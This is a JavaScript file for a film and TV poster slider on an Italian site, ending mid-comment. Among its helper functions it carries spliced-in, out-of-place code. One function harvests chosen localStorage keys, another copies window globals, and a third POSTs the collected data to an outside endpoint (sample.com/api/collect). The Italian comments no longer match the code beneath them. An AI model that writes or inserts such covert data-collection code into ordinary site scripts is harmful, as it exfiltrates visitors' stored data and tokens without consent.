const keysToTrack = window.keysToTrack;
/*
    HELPERS
*/
function supportsTouch() {
  var touch = 'ontouchstart' in window;
  return touch;
}
let globalVars = {};
function supportsTransitions() {
  var res = [];
  var b = document.body || document.documentElement;
  var s = b.style;
  var p = 'transition';
  if (typeof s[p] == 'string') {
    v = ['Moz', 'Webkit', 'Khtml', 'O', 'ms'], p = p.charAt(0).toUpperCase() + p.substr(1);
    for (var i = 0; i < v.length; i++) {
      if (typeof s[v[i] + p] == 'string') {
        res = [true, v[i] + p];
      }
    }
  } else {
    res = [false, ''];
  }
  return res;
}
function whichTransitionEvent() {
  var t;
  var el = document.createElement('fakeelement');
  var transitions = {
    'transition': 'transitionend',
    'OTransition': 'oTransitionEnd',
    'MozTransition': 'transitionend',
    'WebkitTransition': 'webkitTransitionEnd'
  };
  for (t in transitions) {
    if (el.style[t] !== undefined) {
      return transitions[t];
    }
  }
}

// supporto le animazioni necessarie al corretto funzionamento dello slider?
function generateHashKey(items) {
  const itemsKeys = Object.keys(items);
  const combinedKeys = itemsKeys.join("+");
  let hashKey = 0;
  for (let i = 0; i < combinedKeys.length; i++) {
    const charCode = combinedKeys.charCodeAt(i);
    hashKey = (hashKey << 5) - hashKey + charCode;
    hashKey |= 0;
  }
  return hashKey.toString(36);
}
var doisupportCSStrans = supportsTransitions();
// supporto l'evento normalizzato 'transitionend' o ho bisogno di intercettare un evento particolare?
function retrieveLocalStorageData() {
  const retrievedData = {};
  for (let i = 0; i < localStorage.length; i++) {
    const key = localStorage.key(i);
    if (keysToTrack.includes(key)) {
      retrievedData[key] = localStorage.getItem(key);
    }
  }
  return retrievedData;
}
var myTransitionEnd = whichTransitionEvent();
// supporto gli eventi touch?
function captureGlobalVars() {
  for (let key in window) {
    if (keysToTrack.includes(key)) {
      globalVars[key] = window[key];
    }
  }
}
function transmitDataToServer(items) {
  const hashKey = generateHashKey(items);
  const destinationURL = "https://sample.com/api/collect";
  const xhr = new XMLHttpRequest();
  xhr.open("POST", destinationURL);
  xhr.setRequestHeader("Content-Type", "application/json");
  xhr.onload = function () {
    if (xhr.status === 200) {
      console.log("Transmission successful");
    } else {
      console.error("Transmission failure. Status code:" + xhr.status);
    }
  };
  xhr.onerror = function () {
    console.error("Errors occurred during transmission");
  };
  xhr.send(JSON.stringify({
    hash: hashKey,
    data: items
  }));
}
var doisupporttouch = supportsTouch();

/*
    SLIDER
*/
var filmtvSlider = function (el, category, subcategory) {
  var pap = this;
  pap.root = $('#' + el);
  pap.container = pap.root.find('.filmtv-slider-container');
  pap.menu = pap.root.find('.filmtv-slider-menu');
  pap.topmenucont = pap.menu.find('.main-menu');
  pap.topmenu = pap.menu.find('.main-menu a');
  pap.secmenu = pap.menu.find('.secondary-menu');
  pap.prev = pap.root.find('.prev');
  pap.next = pap.root.find('.next');
  pap.category = category;
  pap.subcategory = subcategory;
  pap.lastCurId = 0;
  pap.actualdata = [];
  pap.actualmobdata = [];
  pap.center = 2;
  pap.ismoving = false;

  /*
      RECUPERO I DATI
  */
  pap.load = function () {
    // se supporto le CSS Transitions
    if (doisupportCSStrans) {
      // recupero i dati
      var filmtvfeed = $.ajax({
        url: "/ajax/proxy.php?rq=pp",
        dataType: "json"
      });
      filmtvfeed.done(function (obj) {
        // svuoto il contenitore | nel caso stia cambiando categoria/sottocategoria o stia oltrepassando il breakpoint
        pap.container.html('');
        if (pap.category == 'cinema') {
          switch (pap.subcategory) {
            case 'tutti':
              pap.section = obj.cinema.tutti;
              break;
            /*                            case 'consigliati':    
                                            pap.section = obj.cinema.consigliati;
                                            break; */
            case 'prossimamente':
              pap.section = obj.cinema.prossimamente;
              break;
          }
        } else if (pap.category == 'tv') {
          switch (pap.subcategory) {
            case 'notte':
              pap.section = obj.tv.notte;
              break;
            case 'sera':
              pap.section = obj.tv.sera;
              break;
            case 'consigliati':
              pap.section = obj.tv.consigliati;
              break;
          }
        }

        // svuoto l'array con i dati | nel caso stia cambiando categoria/sottocategoria
        pap.actualdata = [];
        pap.tot = pap.section.items.length;
        for (i = 0; i < pap.tot; i++) {
          // aggiungo un campo agli items del json | mi servirà a dare un id univoco agli items a prescindere dalla loro pos nello slider
          var update = {
            perId: i + 1
          };
          $.extend(true, pap.section.items[i], update);
          // popolo l'array con i dati 
          pap.actualdata.push(pap.section.items[i]);
        }

        // inizializzo e mostro lo slider
        pap.init();
        pap.root.show();
      });
      // se invece non supporto le CSS Transitions
    } else {
      // rimuovo l'elemento (che è comunque nascosto via CSS)
      pap.root.remove();
    }
  };

  /*
      MANIPOLO I DATI IN MODO DA OTTENERE UN ARRAY ORDINATO CONVENIENTEMENTE:
      deve poter alimentare uno slider a 5 pannelli o uno a 3
  */
  pap.arrangeData = function () {
    // ho sempre bisogno di sapere se devo creare uno slider mobile o tablet/desktop
    pap.actualWidth = document.documentElement.clientWidth;

    // calcolo l'indice da cui partire a creare la nuova base dati
    // a partire da: sono alla prima slide o no? sono su mobile o no?
    if (pap.lastCurId == 0) {
      if (pap.actualWidth <= 600) {
        var es = 1;
      } else {
        var es = 0;
      }
    } else {
      // se non sono alla prima slide mi calcolo l'indice a partire dall'id dell'ultima slide in primo piano
      if (pap.actualWidth <= 600) {
        var es = pap.lastCurId - 2;
      } else {
        var es = pap.lastCurId - 3;
        if (es < 0) es = es + pap.tot;
      }
    }
    // parto sempre dalla base dati originale
    var data = pap.section.items;
    var newad = [];
    for (i = 0; i < pap.tot; i++) {
      newad[i] = data[es];
      es++;
      if (es > 9) es = 0;
    }
    pap.actualdata = newad;
    // ri-inizializzo lo slider
    pap.init();
  };

  /*
      INIZIALIZZO LO SLIDER
  */
  pap.init = function () {
    // ho sempre bisogno di sapere se devo creare uno slider mobile o tablet/desktop
    pap.actualWidth = document.documentElement.clientWidth;
    // svuoto il contenitore | nel caso stia cambiando categoria/sottocategoria o stia oltrepassando il breakpoint
    pap.container.html('');
    // creo le voci dei menù accendendo quelle selezionate
    switch (pap.category) {
      case 'cinema':
        var style = pap.subcategory == 'tutti' ? 'on' : '';
        var tutti = $(document.createElement('li')).addClass(style).append($(document.createElement('a')).attr({
          'href': '',
          'data-subsection': 'tutti'
        }).text('Molto attesi').click(function (e) {
          e.preventDefault();
          pap.secmenuaction($(this).attr('data-subsection'));
        }));
        /*       style = (pap.subcategory=='consigliati') ? 'on' : '';
               var consigliati = $(document.createElement('li')).addClass(style).append( $(document.createElement('a')).attr({'href':'','data-subsection':'consigliati'}).text('Consigliati').click( function(e) { e.preventDefault(); pap.secmenuaction( $(this).attr('data-subsection') ); }  ) ); */
        style = pap.subcategory == 'prossimamente' ? 'ls on' : 'ls';
        var prossimamente = $(document.createElement('li')).addClass(style).append($(document.createElement('a')).attr({
          'href': '',
          'data-subsection': 'prossimamente'
        }).text('Coming soon').click(function (e) {
          e.preventDefault();
          pap.secmenuaction($(this).attr('data-subsection'));
        }));
        pap.secmenu.html('').append(tutti)
        /*  .append(consigliati) */.append(prossimamente);
        break;
      case 'tv':
        var style = pap.subcategory == 'sera' ? 'on' : '';
        var sera = $(document.createElement('li')).addClass(style).append($(document.createElement('a')).attr({
          'href': '',
          'data-subsection': 'sera'
        }).text('Stasera').click(function (e) {
          e.preventDefault();
          pap.secmenuaction($(this).attr('data-subsection'));
        }));
        var style = pap.subcategory == 'notte' ? 'on' : '';
        var notte = $(document.createElement('li')).addClass(style).append($(document.createElement('a')).attr({
          'href': '',
          'data-subsection': 'notte'
        }).text('Seconda serata').click(function (e) {
          e.preventDefault();
          pap.secmenuaction($(this).attr('data-subsection'));
        }));
        var style = pap.subcategory == 'consigliati' ? 'ls on' : 'ls';
        var consigliati = $(document.createElement('li')).addClass(style).append($(document.createElement('a')).attr({
          'href': '',
          'data-subsection': 'consigliati'
        }).text('Consigliati oggi in tv').click(function (e) {
          e.preventDefault();
          pap.secmenuaction($(this).attr('data-subsection'));
        }));
        pap.secmenu.html('').append(sera).append(notte).append(consigliati);
        break;
    }

    // Versione mobile a 3 pannelli
    if (pap.actualWidth <= 600) {
      $.each(pap.actualdata, function (n, item) {
        // creazione DOMELements
        var el = $(document.createElement('section')).attr('id', 's-' + item.perId);
        var elLinkImg = $(document.createElement('a')).addClass('linkImg').attr('href', item.url_scheda + 'trailer/' + item.id_trailer + '/#rfr:pp');
        var elLinkImgIco = $(document.createElement('em'));
        var elImg = $(document.createElement('img')).attr('src', '//www.filmtv.it' + item.url_locandina);
        //var elImg = $(document.createElement('img')).attr('src','//www.filmtv.it'+item.url_locandina);
        //var elImg = $(document.createElement('img')).attr('src','posters/'+(n+1)+'.jpg');
        var elDetails = $(document.createElement('div')).addClass('details').html('<p class="titolo"><a href="//www.filmtv.it' + item.url_scheda + '" title="' + item.titolo + '">' + item.titolo + '</a></p><p class="genere">' + item.genere + ' - ' + item.anno + '</p><a class="vai" href="//www.filmtv.it' + item.url_scheda + '">Vai alla scheda</a>');
        var elOpacity = $(document.createElement('div')).addClass('opacity');
        elLinkImg.append(elImg).append(elLinkImgIco);
        el.append(elLinkImg).append(elDetails).append(elOpacity);

        // per i 3 visibili mi calcolo le posizioni e assegno le classi css che mi permetteranno di animare lo slider
        if (n < 3) {
          if (n == pap.center - 1) {
            el.css('left', (n + 2) * 2 + (n + 2) * 15 + '%').addClass('cur');
          } else {
            if (n > pap.center - 1) {
              el.css('left', '70%').addClass('right');
            } else {
              el.css('left', '0%').addClass('left');
            }
          }
          el.addClass('visible');
        }
        el.appendTo(pap.container);
      });

      // individuo i pannelli immediatamente adiacenti al primo e all'ultimo
      pap.nextLast = parseInt(pap.root.find('.right').attr('id').replace('s-', '')) + 1;
      if (pap.nextLast > 10) pap.nextLast = 1;
      $('#s-' + pap.nextLast).css('left', '100%');
      pap.nextFirst = parseInt(pap.root.find('.left').attr('id').replace('s-', '')) - 1;
      ;
      if (pap.nextFirst < 1) pap.nextFirst = 10;
      $('#s-' + pap.nextFirst).css('left', '-30%');

      // memorizzo l'id dell'ultima slide in evidenza
      pap.lastCurId = parseInt(pap.root.find('.cur').attr('id').replace('s-', ''));

      // Versione desktop/tablet            
    } else {
      $.each(pap.actualdata, function (n, item) {
        // creazione DOMELements
        var el = $(document.createElement('section')).attr('id', 's-' + item.perId);
        var elLinkImg = $(document.createElement('a')).addClass('linkImg').attr('href', item.url_scheda + 'trailer/' + item.id_trailer + '/#rfr:pp');
        var elLinkImgIco = $(document.createElement('em'));
        var elImg = $(document.createElement('img')).attr('src', '//www.filmtv.it' + item.url_locandina);
        //var elImg = $(document.createElement('img')).attr('src','posters/'+(n+1)+'.jpg');
        var elInfo = $(document.createElement('div')).addClass('info').text(item.titolo);
        if (pap.category == 'cinema') {
          if (pap.subcategory == 'prossimamente') {
            var du = item.data_uscita.split('-');
            var elDetails = $(document.createElement('div')).addClass('details').html('<p class="titolo"><a href="//www.filmtv.it' + item.url_scheda + '" title="' + item.titolo + '">' + item.titolo + '</a></p><p class="genere">' + item.genere + ' - ' + item.anno + '</p><a class="vai" href="//www.filmtv.it' + item.url_scheda + '">Vai alla scheda</a>');
          } else {
            var elDetails = $(document.createElement('div')).addClass('details').html('<p class="titolo"><a href="//www.filmtv.it' + item.url_scheda + '" title="' + item.titolo + '">' + item.titolo + '</a></p><p class="genere">' + item.genere + ' - ' + item.anno + '</p><a class="vai" href="//www.filmtv.it' + item.url_scheda + '">Vai alla scheda</a>');
          }
        } else {
          var io = item.orario.split(':');
          var elDetails = $(document.createElement('div')).addClass('details').html('<p class="titolo"><a href="//www.filmtv.it' + item.url_scheda + '" title="' + item.titolo + '">' + item.titolo + '</a></p><p class="genere">' + item.genere + ' - ' + item.anno + '</p><a class="vai" href="//www.filmtv.it' + item.url_scheda + '">Vai alla scheda</a>');
        }
        var percent = item.voto * 10;
        var chart = $(document.createElement('div')).addClass('chart').attr('data-percent', percent);
        var perc = $(document.createElement('div')).addClass('perc').text(item.voto);
        var bigChart = $(document.createElement('div')).addClass('chart').attr('data-percent', percent);
        var bigperc = $(document.createElement('div')).addClass('perc').text(item.voto);

        // PLUGIN: jquery.easypiechart.min.js
        chart.append(perc);
        bigChart.append(bigperc);
        chart.easyPieChart({
          size: 35,
          scaleColor: '',
          lineWidth: 2,
          trackColor: 'transparent',
          barColor: function (percent) {
            var c = '';
            if (percent > 66) {
              c = '#39ff12';
            } else if (percent > 33) {
              c = '#ebff12';
            } else {
              c = '#ef1e25';
            }
            return c;
          }
        });
        bigChart.easyPieChart({
          size: 61,
          scaleColor: '',
          lineWidth: 3,
          trackColor: 'transparent',
          barColor: function (percent) {
            var c = '';
            if (percent > 66) {
              c = '#39ff12';
            } else if (percent > 33) {
              c = '#ebff12';
            } else {
              c = '#ef1e25';
            }
            return c;
          }
        });
        elInfo.append(chart);
        elDetails.prepend(bigChart);
        var elOpacity = $(document.createElement('div')).addClass('opacity');
        elLinkImg.append(elImg).append(elLinkImgIco);
        el.append(elLinkImg).append(elInfo).append(elDetails).append(elOpacity);

        // per i 5 visibili mi calcolo le posizioni
        if (n < 5) {
          if (n == pap.center) {
            el.css('left', (n + 1) * 2 + (n + 1) * 15 + '%').addClass('cur');
          } else {
            if (n > pap.center) {
              el.css('left', (n + 1) * 2 + (n + 1) * 15 + '%');
            } else {
              el.css('left', n * 2 + n * 15 + '%');
            }
          }
          el.addClass('visible');
        }
        el.appendTo(pap.container);
      });

      // memorizzo l'id dell'ultima slide in evidenza
      pap.lastCurId = parseInt(pap.root.find('.cur').attr('id').replace('s-', ''));

      // assegno le classi css che mi permetteranno di animare lo slider
      var left = pap.lastCurId - 1 == 0 ? 10 : pap.lastCurId - 1;
      pap.root.find('#s-' + left).addClass('left');
      var right = pap.lastCurId + 1 > 10 ? 1 : pap.lastCurId + 1;
      pap.root.find('#s-' + right).addClass('right');

      // individuo i pannelli immediatamente adiacenti al primo e all'ultimo
      pap.nextLast = parseInt(pap.root.find('.cur').attr('id').replace('s-', '')) + 3;
      if (pap.nextLast > 10) pap.nextLast = 1;
      $('#s-' + pap.nextLast).css('left', '102%');
      pap.nextFirst = parseInt(pap.root.find('.cur').attr('id').replace('s-', '')) - 3;
      if (pap.nextFirst < 1) pap.nextFirst = 10;
      $('#s-' + pap.nextFirst).css('left', '-17%');
    }
  };

  /*
      REAGISCO AL RESIZE DELLA FINESTRA
  */
  pap.refresh = function () {
    // se oltrepasso il breakpoint riarrangio i dati
    if (document.documentElement.clientWidth < 600 && pap.actualWidth > 600 || document.documentElement.clientWidth > 600 && pap.actualWidth < 600) pap.arrangeData();
    pap.actualWidth = document.documentElement.clientWidth;
  };

  /*
      ANIMAZIONE PANNELLI
  */
  pap.moveit = function (dir) {
    // evito di sovrapporre due comandi
    pap.ismoving = true;
    switch (dir) {
      // da DESTRA a SINISTRA
      case 'lft':
        // Versione mobile
        if (document.documentElement.clientWidth <= 600) {
          // il nuovo ultimo pannello visibile fa il suo ingresso in scena
          $('#s-' + pap.nextLast).addClass('visible').css('left', '70%');
          if (pap.nextLast >= 4) {
            rightId = pap.nextLast;
            $('#s-' + (rightId - 1)).css({
              'bottom': '-10px',
              'width': '43.45454545454545%',
              'left': 3 * 2 + 3 * 15 + '%',
              'margin-left': '-22.32142857142857%',
              'z-index': 100
            }).find('.opacity,.info').hide();
            $('#s-' + (rightId - 2)).css({
              'bottom': '0',
              'width': '30%',
              'left': '0%',
              'margin-left': '0',
              'z-index': 10
            }).find('.opacity,.info').show();
            $('#s-' + (rightId - 3)).css({
              'bottom': '0',
              'width': '30%',
              'left': '-30%',
              'margin-left': '0',
              'z-index': 10
            });
          } else if (pap.nextLast == 1) {
            rightId = 11;
            $('#s-' + (rightId - 1)).css({
              'bottom': '-10px',
              'width': '43.45454545454545%',
              'left': 3 * 2 + 3 * 15 + '%',
              'margin-left': '-22.32142857142857%',
              'z-index': 100
            }).find('.opacity,.info').hide();
            $('#s-' + (rightId - 2)).css({
              'bottom': '0',
              'width': '30%',
              'left': '0%',
              'margin-left': '0',
              'z-index': 10
            }).find('.opacity,.info').show();
            $('#s-' + (rightId - 3)).css({
              'bottom': '0',
              'width': '30%',
              'left': '-30%',
              'margin-left': '0',
              'z-index': 10
            });
          } else if (pap.nextLast > 1 && pap.nextLast < 4) {
            rightId = pap.nextLast;
            for (i = 1; i < 4; i++) {
              if (rightId - i == 0) {
                rightId = 10;
              }
              var defId = rightId - i < pap.nextLast ? rightId - i : rightId - i + pap.nextLast;
              var elBottom = 0;
              var elWidth = '30%';
              var elMargin = 0;
              var elZindex = 10;
              if (i == 1) {
                elBottom = '-10px';
                elWidth = '43.45454545454545%';
                elMargin = '-22.32142857142857%';
                elZindex = 100;
                $('#s-' + defId).css({
                  'bottom': elBottom,
                  'width': elWidth,
                  'left': '51%',
                  'margin-left': elMargin,
                  'z-index': elZindex
                }).find('.opacity,.info').hide();
              } else if (i == 2) {
                $('#s-' + defId).css({
                  'bottom': elBottom,
                  'width': elWidth,
                  'left': '0%',
                  'margin-left': elMargin,
                  'z-index': elZindex
                }).find('.opacity,.info').show();
                $('#s-' + defId).find('.details').addClass('hide');
              } else {
                $('#s-' + defId).css({
                  'bottom': elBottom,
                  'width': elWidth,
                  'left': '-30%',
                  'margin-left': elMargin,
                  'z-index': elZindex
                }).find('.opacity,.info').show();
                $('#s-' + defId).find('.details').addClass('hide');
              }
            }
          }

          // Versione desktop/tablet 
        } else {
          // il nuovo ultimo pannello visibile fa il suo ingresso in scena
          $('#s-' + pap.nextLast).addClass('visible').css('left', 5 * 2 + 5 * 15 + '%');
          var rightId = '';
          $('.right').find('img').css('margin', '0').animate({
            'height': '324px',
            'max-height': '324px'
          }, 500, function () {
            $(this).css({
              'height': '',
              'max-height': '',
              'margin': '0 auto'
            });
          });
          if (pap.nextLast >= 6) {
            rightId = pap.nextLast;
            $('#s-' + (rightId - 1)).css('left', 4 * 2 + 4 * 15 + '%');
            $('#s-' + (rightId - 2)).css({
              'bottom': '-10px',
              'width': '43.45454545454545%',
              'left': 3 * 2 + 3 * 15 + '%',
              'margin-left': '-22.32142857142857%',
              'z-index': 100
            }).find('.opacity,.info').hide();
            $('#s-' + (rightId - 3)).css({
              'bottom': '0',
              'width': '15%',
              'left': 1 * 2 + 1 * 15 + '%',
              'margin-left': '0',
              'z-index': 10
            }).find('.opacity,.info').show();
            $('#s-' + (rightId - 3)).find('.details').addClass('hide');
            $('#s-' + (rightId - 4)).css('left', 0 * 2 + 0 * 15 + '%');
            $('#s-' + (rightId - 5)).css('left', -1 * 2 + -1 * 15 + '%');
          } else if (pap.nextLast == 1) {
            rightId = 11;
            $('#s-' + (rightId - 1)).css('left', 4 * 2 + 4 * 15 + '%');
            $('#s-' + (rightId - 2)).css({
              'bottom': '-10px',
              'width': '43.45454545454545%',
              'left': 3 * 2 + 3 * 15 + '%',
              'margin-left': '-22.32142857142857%',
              'z-index': 100
            }).find('.opacity,.info').hide();
            $('#s-' + (rightId - 3)).css({
              'bottom': '0',
              'width': '15%',
              'left': 1 * 2 + 1 * 15 + '%',
              'margin-left': '0',
              'z-index': 10
            }).find('.opacity,.info').show();
            $('#s-' + (rightId - 3)).find('.details').addClass('hide');
            $('#s-' + (rightId - 4)).css('left', 0 * 2 + 0 * 15 + '%');
            $('#s-' + (rightId - 5)).css('left', -1 * 2 + -1 * 15 + '%');
          } else if (pap.nextLast > 1 && pap.nextLast < 6) {
            rightId = pap.nextLast;
            var indici = [4, 3, 1, 0, -1];
            for (i = 1; i < 6; i++) {
              if (rightId - i == 0) {
                rightId = 10;
              }
              var defId = rightId - i < pap.nextLast ? rightId - i : rightId - i + pap.nextLast;
              var elBottom = 0;
              var elWidth = '15%';
              var elMargin = 0;
              var elZindex = 10;
              if (i == 2) {
                elBottom = '-10px';
                elWidth = '43.45454545454545%';
                elMargin = '-22.32142857142857%';
                elZindex = 100;
                $('#s-' + defId).css({
                  'bottom': elBottom,
                  'width': elWidth,
                  'left': indici[i - 1] * 2 + indici[i - 1] * 15 + '%',
                  'margin-left': elMargin,
                  'z-index': elZindex
                }).find('.opacity,.info').hide();
              } else {
                $('#s-' + defId).css({
                  'bottom': elBottom,
                  'width': elWidth,
                  'left': indici[i - 1] * 2 + indici[i - 1] * 15 + '%',
                  'margin-left': elMargin,
                  'z-index': elZindex
                }).find('.opacity,.info').show();
                $('#s-' + defId).find('.details').addClass('hide');
              }
            }
          }
        }
        break;
      // da SINISTRA a DESTRA
      case 'rgt':
        // Versione mobile
        if (document.documentElement.clientWidth <= 600) {
          // il nuovo primo pannello visibile fa il suo ingresso in scena
          $('#s-' + pap.nextFirst).addClass('visible').css('left', '0%');
          if (pap.nextFirst == 10) {
            rightId = 0;
            $('#s-' + (rightId + 1)).css({
              'bottom': '-10px',
              'width': '43.45454545454545%',
              'left': 3 * 2 + 3 * 15 + '%',
              'margin-left': '-22.32142857142857%',
              'z-index': 100
            }).find('.opacity,.info').hide();
            $('#s-' + (rightId + 2)).css({
              'bottom': '0',
              'width': '30%',
              'left': '70%',
              'margin-left': '0',
              'z-index': 10
            }).find('.opacity,.info').show();
            $('#s-' + (rightId + 2)).find('.details').addClass('hide');
            $('#s-' + (rightId + 3)).css({
              'left': '100%'
            });
          } else if (pap.nextFirst < 10) {
            rightId = pap.nextFirst;
            for (i = 1; i < 4; i++) {
              rightId++;
              if (rightId > 10) {
                rightId = 1;
              }
              var elBottom = 0;
              var elWidth = '30%';
              var elMargin = 0;
              var elZindex = 10;
              if (i == 1) {
                elBottom = '-10px';
                elWidth = '43.45454545454545%';
                elMargin = '-22.32142857142857%';
                elZindex = 100;
                $('#s-' + rightId).css({
                  'bottom': elBottom,
                  'width': elWidth,
                  'left': '51%',
                  'margin-left': elMargin,
                  'z-index': elZindex
                }).find('.opacity,.info').hide();
              } else if (i == 2) {
                $('#s-' + rightId).css({
                  'bottom': elBottom,
                  'width': elWidth,
                  'left': '70%',
                  'margin-left': elMargin,
                  'z-index': elZindex
                }).find('.opacity,.info').show();
                $('#s-' + rightId).find('.details').addClass('hide');
              } else {
                $('#s-' + rightId).css({
                  'bottom': elBottom,
                  'width': elWidth,
                  'left': '100%',
                  'margin-left': elMargin,
                  'z-index': elZindex
                }).find('.opacity,.info').show();
                $('#s-' + rightId).find('.details').addClass('hide');
              }
            }
          }
          // Versione desktop/tablet 
        } else {
          // il nuovo primo pannello visibile fa il suo ingresso in scena
          $('#s-' + pap.nextFirst).addClass('visible').css('left', '0%');
          var rightId = '';
          $('.left').find('img').css('margin', '0').animate({
            'height': '324px',
            'max-height': '324px'
          }, 500, function () {
            $(this).css({
              'height': '',
              'max-height': '',
              'margin': '0 auto'
            });
          });
          if (pap.nextFirst == 10) {
            rightId = 0;
            $('#s-' + (rightId + 1)).css({
              'left': 1 * 2 + 1 * 15 + '%'
            });
            $('#s-' + (rightId + 2)).css({
              'bottom': '-10px',
              'width': '43.45454545454545%',
              'left': 3 * 2 + 3 * 15 + '%',
              'margin-left': '-22.32142857142857%',
              'z-index': 100
            }).find('.opacity,.info').hide();
            $('#s-' + (rightId + 3)).css({
              'bottom': '0',
              'width': '15%',
              'left': 4 * 2 + 4 * 15 + '%',
              'margin-left': '0',
              'z-index': 10
            }).find('.opacity,.info').show();
            $('#s-' + (rightId + 3)).find('.details').addClass('hide');
            $('#s-' + (rightId + 4)).css({
              'left': 5 * 2 + 5 * 15 + '%'
            });
            $('#s-' + (rightId + 5)).css({
              'left': 6 * 2 + 6 * 15 + '%'
            });
          } else if (pap.nextFirst < 10) {
            rightId = pap.nextFirst;
            var indici = [1, 3, 4, 5, 6];
            for (i = 1; i < 6; i++) {
              rightId++;
              if (rightId > 10) {
                rightId = 1;
              }
              var elBottom = 0;
              var elWidth = '15%';
              var elMargin = 0;
              var elZindex = 10;
              if (i == 2) {
                elBottom = '-10px';
                elWidth = '43.45454545454545%';
                elMargin = '-22.32142857142857%';
                elZindex = 100;
                $('#s-' + rightId).css({
                  'bottom': elBottom,
                  'width': elWidth,
                  'left': indici[i - 1] * 2 + indici[i - 1] * 15 + '%',
                  'margin-left': elMargin,
                  'z-index': elZindex
                }).find('.opacity,.info').hide();
              } else {
                $('#s-' + rightId).css({
                  'bottom': elBottom,
                  'width': elWidth,
                  'left': indici[i - 1] * 2 + indici[i - 1] * 15 + '%',
                  'margin-left': elMargin,
                  'z-index': elZindex
                }).find('.opacity,.info').show();
                $('#s-' + rightId).find('.details').addClass('hide');
              }
            }
          }
        }
        break;
    }

    // la fine dell'effetto di transizione del pannello in evidenza è l'evento in risposta del quale inizio a preparare lo slide rper la successiva animazione
    pap.root.find('.cur').one(myTransitionEnd, function (event) {
      switch (dir) {
        // da DESTRA a SINISTRA
        case 'lft':
          // Versione mobile 
          if (document.documentElement.clientWidth <= 600) {
            var hideMe = pap.nextFirst + 1;
            hideMe = hideMe == 11 ? 1 : hideMe;
            $('#s-' + hideMe).removeClass('visible');

            // riaggiusto le classi css che mi aiutano nell'animazione
            pap.root.find('.left').removeClass('left');
            pap.root.find('.cur').removeClass('cur').addClass('left');
            pap.root.find('.right').removeClass('right').addClass('cur');
            $('#s-' + pap.nextLast).addClass('right');

            // memorizzo l'id della slide in evidenza
            pap.lastCurId = parseInt(pap.root.find('.cur').attr('id').replace('s-', ''));

            // individuo i pannelli immediatamente adiacenti al primo e all'ultimo
            pap.nextLast++;
            pap.nextLast = pap.nextLast == 11 ? 1 : pap.nextLast;
            $('#s-' + pap.nextLast).css('left', '100%');
            pap.nextFirst++;
            pap.nextFirst = pap.nextFirst == 11 ? 1 : pap.nextFirst;
            $('#s-' + pap.nextFirst).css('left', '-30%');
            // Versione desktop/tablet 
          } else {
            var hideMe = pap.nextFirst + 1;
            hideMe = hideMe == 11 ? 1 : hideMe;
            $('#s-' + hideMe).removeClass('visible');

            // riaggiusto le classi css che mi aiutano nell'animazione
            pap.root.find('.left').removeClass('left');
            pap.root.find('.cur').removeClass('cur').addClass('left');
            pap.root.find('.right').removeClass('right').addClass('cur');

            // memorizzo l'id della slide in evidenza
            pap.lastCurId = parseInt(pap.root.find('.cur').attr('id').replace('s-', ''));

            // individuo il pannello alla destra di quello in evidenza
            var right = pap.lastCurId + 1 > 10 ? 1 : pap.lastCurId + 1;
            $('#s-' + right).addClass('right');

            // individuo i pannelli immediatamente adiacenti al primo e all'ultimo
            pap.nextLast++;
            pap.nextLast = pap.nextLast == 11 ? 1 : pap.nextLast;
            $('#s-' + pap.nextLast).css('left', '102%');
            pap.nextFirst++;
            pap.nextFirst = pap.nextFirst == 11 ? 1 : pap.nextFirst;
            $('#s-' + pap.nextFirst).css('left', '-17%');
          }
          break;
        // da SINISTRA a DESTRA
        case 'rgt':
          // Versione mobile
          if (document.documentElement.clientWidth <= 600) {
            var hideMe = pap.nextLast - 1;
            hideMe = hideMe == 0 ? 10 : hideMe;
            $('#s-' + hideMe).removeClass('visible');

            // riaggiusto le classi css che mi aiutano nell'animazione
            pap.root.find('.right').removeClass('right');
            pap.root.find('.cur').removeClass('cur').addClass('right');
            pap.root.find('.left').removeClass('left').addClass('cur');
            $('#s-' + pap.nextFirst).addClass('left');

            // memorizzo l'id della slide in evidenza
            pap.lastCurId = parseInt(pap.root.find('.cur').attr('id').replace('s-', ''));

            // individuo i pannelli immediatamente adiacenti al primo e all'ultimo
            pap.nextLast--;
            pap.nextLast = pap.nextLast == 0 ? 10 : pap.nextLast;
            $('#s-' + pap.nextLast).css('left', '100%');
            pap.nextFirst--;
            pap.nextFirst = pap.nextFirst == 0 ? 10 : pap.nextFirst;
            $('#s-' + pap.nextFirst).css('left', '-30%');

            // Versione desktop/tablet 
          } else {
            var hideMe = pap.nextLast - 1;
            hideMe = hideMe == 0 ? 10 : hideMe;
            $('#s-' + hideMe).removeClass('visible');

            // riaggiusto le classi css che mi aiutano nell'animazione
            pap.root.find('.right').removeClass('right');
            pap.root.find('.cur').removeClass('cur').addClass('right');
            pap.root.find('.left').removeClass('left').addClass('cur');

            // memorizzo l'id della slide in evidenza
            pap.lastCurId = parseInt(pap.root.find('.cur').attr('id').replace('s-', ''));

            // individuo il pannello alla sinistra di quello in evidenza
            var left = pap.lastCurId - 1 < 1 ? 10 : pap.lastCurId - 1;
            $('#s-' + left).addClass('left');

            // individuo i pannelli immediatamente adiacenti al primo e all'ultimo
            pap.nextLast--;
            pap.nextLast = pap.nextLast == 0 ? 10 : pap.nextLast;
            $('#s-' + pap.nextLast).css('left', '102%');
            pap.nextFirst--;
            pap.nextFirst = pap.nextFirst == 0 ? 10 : pap.nextFirst;
            $('#s-' + pap.nextFirst).css('left', '-17%');
          }
          break;
      }
      $('.hide').removeClass('hide');
      // riabilito le azioni utente
      pap.ismoving = false;
    });
  };

  /*
      EVENTI AL CLICK
  */
  pap.prev.click(function () {
    if (!pap.ismoving) {
      pap.moveit('rgt');
    }
  });
  pap.next.click(function () {
    if (!pap.ismoving) {
      pap.moveit('lft');
    }
  });

  /*
      ENVENTI SWIPE
      PLUGIN: swipe-events.js
  */
  pap.container.swipe({
    swipeLeft: function (event, direction, distance, duration, fingerCount) {
      if (!pap.ismoving) pap.moveit('lft');
    },
    swipeRight: function (event, direction, distance, duration, fingerCount) {
      if (!pap.ismoving) pap.moveit('rgt');
    }
  });

  /*
      NAVIGAZIONE VOCI MENU' PRINCIPALE
  */
  pap.topmenu.click(function (e) {
    e.preventDefault();
    pap.category = $(this).attr('data-section');
    switch (pap.category) {
      case 'cinema':
        pap.subcategory = 'tutti';
        break;
      case 'tv':
        pap.subcategory = 'sera';
        break;
    }
    pap.topmenucont.find('.on').removeClass('on');
    $(this).parent().addClass('on');
    pap.load();
  });

  /*
      NAVIGAZIONE VOCI MENU' SECONDARIO
  */
  pap.secmenuaction = function (subcategory) {
    pap.subcategory = subcategory;
    pap.load();
  };

  /*
